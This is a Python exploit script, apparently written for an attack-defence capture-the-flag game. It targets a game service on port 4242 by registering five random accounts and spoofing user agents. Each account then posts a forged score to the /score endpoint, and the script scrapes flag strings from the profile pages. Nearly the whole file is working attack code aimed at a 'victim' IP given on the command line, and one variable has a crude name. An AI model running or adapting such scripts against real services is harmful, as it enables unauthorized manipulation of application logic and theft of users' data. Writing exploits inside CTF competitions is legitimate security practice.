#!/usr/bin/env python3

import requests
import random
import string
import ua_generator
import re
import sys
import json


port = 4242
flag_regexp = re.compile(r'[A-Z0-9]{31}=')


class Hacker:
    def __init__(self, ip):
        self.host = f"http://{ip}:{port}"
        self.session = requests.Session()
        self.session.headers = {"User-agent": ua_generator.generate().text}

        random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))
        self.username = random_string
        self.password = random_string

        self.register()
        self.login()


    def register(self) -> str:
        resp = self.session.post(
            self.host + "/register",
            data = {
                "username": self.username,
                "password": self.password
            }
        )
        return resp.text


    def login(self) -> str:
        resp = self.session.post(
            self.host + "/login",
            data = {
                "username": self.username,
                "password": self.password
            }
        )
        return resp.text


    def cheating(self) -> str:
        resp = self.session.post(
            self.host + "/score",
            json = {
                "game_id":1,
                "score":101,
                "time":1
            }
        )
        return resp.text


    def profile(self) -> str:
        resp = self.session.get(
            self.host + "/profile.html"
        )
        return resp.text


    def find_flags(self, text: str):
        print( flag_regexp.findall(text), flush=True )

    
def main():

    try:
        ip = sys.argv[1]
    except:
        print(f"USAGE:\t{sys.argv[0]} <victim-ip-address>")
        sys.exit(1)

    users = [ Hacker(ip) for _ in range(5) ]

    for bigdickuser in users:
        bigdickuser.cheating()

    input("Waiting new users...")
    for bigdickuser in users:
        profile_page = bigdickuser.profile()
        bigdickuser.find_flags(profile_page)


if __name__ == "__main__":
    main()